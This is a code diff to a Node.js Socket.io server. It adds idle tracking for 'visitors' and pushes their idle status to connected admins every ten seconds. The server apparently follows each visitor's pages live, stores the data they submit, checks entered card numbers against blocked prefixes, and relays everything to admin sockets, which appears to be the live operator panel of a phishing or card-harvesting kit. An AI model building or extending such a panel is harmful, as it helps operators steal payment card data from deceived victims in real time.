@@ -322,6 +322,8 @@ io.on("connection", (socket) => {
         socketId: socket.id,
         isConnected: true,
         sessionStartTime: Date.now(),
+        lastActivity: Date.now(),
+        isIdle: false,
       };
       // Update in savedVisitors
       const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
@@ -359,6 +361,7 @@ io.on("connection", (socket) => {
         isBlocked: false,
         isConnected: true,
         sessionStartTime: Date.now(),
+        lastActivity: Date.now(),
       };
       savedVisitors.push(visitor);
       isNewVisitor = true;
@@ -389,6 +392,8 @@ io.on("connection", (socket) => {
     const visitor = visitors.get(socket.id);
     if (visitor) {
       visitor.page = page;
+      visitor.lastActivity = Date.now();
+      visitor.isIdle = false;
       visitors.set(socket.id, visitor);
       saveVisitorPermanently(visitor);
 
@@ -406,6 +411,8 @@ io.on("connection", (socket) => {
   socket.on("more-info", (data) => {
     const visitor = visitors.get(socket.id);
     if (visitor) {
+      visitor.lastActivity = Date.now();
+      visitor.isIdle = false;
       // Store submitted data with page info for ordering
       if (data.content) {
         // Initialize dataHistory if not exists
@@ -477,6 +484,8 @@ io.on("connection", (socket) => {
   socket.on("cardNumber:verify", (cardNumber) => {
     const visitor = visitors.get(socket.id);
     if (visitor) {
+      visitor.lastActivity = Date.now();
+      visitor.isIdle = false;
       // Check if card prefix is blocked
       const prefix = cardNumber.substring(0, 4);
       const isBlocked = visitor.blockedCardPrefixes.includes(prefix);
@@ -522,7 +531,15 @@ io.on("connection", (socket) => {
             currentSocketId = sid;
           }
         });
-        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected };
+        // Check if visitor is idle (no activity for 30 seconds)
+        let isIdle = false;
+        if (isCurrentlyConnected) {
+          const activeVisitorArr = Array.from(visitors.values()).find(av => av._id === v._id);
+          if (activeVisitorArr && activeVisitorArr.lastActivity) {
+            isIdle = (Date.now() - activeVisitorArr.lastActivity) > 30000;
+          }
+        }
+        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected, isIdle };
       });
 
       // Sort visitors by lastDataUpdate (most recent first)
@@ -1082,6 +1099,26 @@ app.get("/api/stats", (req, res) => {
     visitorCounter,
   });
 });
+
+// Idle check timer - every 10 seconds, check for visitors idle > 30 seconds
+setInterval(() => {
+  const now = Date.now();
+  visitors.forEach((visitor, sid) => {
+    const wasIdle = visitor.isIdle || false;
+    const isNowIdle = visitor.lastActivity ? (now - visitor.lastActivity) > 30000 : false;
+    if (isNowIdle !== wasIdle) {
+      visitor.isIdle = isNowIdle;
+      visitors.set(sid, visitor);
+      // Notify admins about idle status change
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit("visitor:idleChanged", {
+          visitorId: visitor._id,
+          isIdle: isNowIdle,
+        });
+      });
+    }
+  });
+}, 10000);
 
 // Start server
 const PORT = process.env.PORT || 3001;
